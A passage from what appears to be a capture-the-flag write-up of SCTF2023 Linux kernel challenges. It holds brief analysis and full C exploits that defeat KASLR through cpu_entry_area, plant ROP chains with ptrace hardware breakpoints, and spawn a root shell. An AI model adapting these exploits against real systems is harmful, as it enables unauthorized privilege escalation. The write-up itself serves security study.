swapgs_restore_regs_and_return_to_usermode;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[idx++] = user_cs;<br>    rop_chain[idx++] = user_rflags;<br>    rop_chain[idx++] = user_sp;<br>    rop_chain[idx++] = user_ss;<br><br><br>    write(rop_pipe[<span class="hljs-number">1</span>], rop_chain, MMAP_SIZE);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SCTF2023-sycrop"><a href="#SCTF2023-sycrop" class="headerlink" title="SCTF2023-sycrop"></a>SCTF2023-sycrop</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123544.png" style="zoom:50%;" /><h4 id="0x5555"><a href="#0x5555" class="headerlink" title="0x5555"></a>0x5555</h4><p>任意地址读8字节</p><h4 id="0x6666"><a href="#0x6666" class="headerlink" title="0x6666"></a>0x6666</h4><p>经过调试发现就是<code>call rdx</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>通过任意地址读一个<code>cpu_entry_area</code>中的一个<code>data</code>泄露<code>kalsr</code>，然后设置硬件断点，布置好寄存器后触发硬件断点，跳转到寄存器在<code>cpu_entry_area</code>的<code>DB stack</code>处执行rop链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> status;<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> syc_regs_37 = <span class="hljs-number">0xffffffff81eec205</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> leak;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff81002c9d</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810bb5b0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a4cbf8</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode  = <span class="hljs-number">0xffffffff82000ed0</span> + <span class="hljs-number">49</span>;<br><br><span class="hljs-comment">// 0xffffffff811ff188 : add rsp, 0x68 ; jmp 0xffffffff82203340</span><br><span class="hljs-comment">// 0xffffffff81002c9d: pop rdi; ret;</span><br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810bb5b0</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82a4cbf8</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff82000ed0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><span class="hljs-type">size_t</span> get_root_func = (<span class="hljs-type">size_t</span>)get_root_shell;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/seven&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br><br>    leak = ioctl(dev_fd, <span class="hljs-number">0x5555</span>, <span class="hljs-number">0xfffffe0000002f38</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>,leak);<br>    kernel_offset = leak - syc_regs_37;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>,kernel_offset);<br><br>    commit_creds += kernel_offset;<br>    init_cred += kernel_offset;<br>    pop_rdi += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br><br>    hbp_pid = fork();<br>    <span class="hljs-keyword">if</span> (hbp_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        ptrace(PTRACE_TRACEME,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br>        raise(SIGSTOP);<br>        __asm__(<br>        <span class="hljs-string">&quot;mov r15,   pop_rdi;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   init_cred;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   get_root_func;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   user_cs;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    user_rflags;&quot;</span>   <br>        <span class="hljs-string">&quot;mov r8,    user_sp;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   user_ss;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xdeadbeef;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   0xdeadbeef;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   buf;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   [rsi];&quot;</span><br>    );<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);<br>    create_hbp(buf);<br><br>    ptrace(PTRACE_CONT,hbp_pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);            <br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);          <br><br>    ptrace(PTRACE_CONT,hbp_pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);     <br><br>    ioctl(dev_fd,<span class="hljs-number">0x6666</span>,<span class="hljs-number">0xfffffe0000010f58</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SCTF2023-sycrpg"><a href="#SCTF2023-sycrpg" class="headerlink" title="SCTF2023-sycrpg"></a>SCTF2023-sycrpg</h2><p>PS:启动脚本有点bug，建议手动指定多核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>    -cpu kvm64,+smep,+smap\<br>    -netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>    -nographic \<br>    -no-reboot \<br>    -smp 2 \<br>    -s<br></code></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123619.png" style="zoom:50%;" /><p>满足条件后即可选定一个任意地址（选了之后就固定了）写一字节</p><p>那还是hack rcx，没什么区别</p><h3 id="FINAL-EXP"><a href="#FINAL-EXP" class="headerlink" title="FINAL EXP"></a>FINAL EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810eeec0</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82e8abe0</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff81e010b0</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], rop_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> canary;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> leak;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810eeec0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82e8abe0</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81e010b0</span>;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff810aaa80</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span 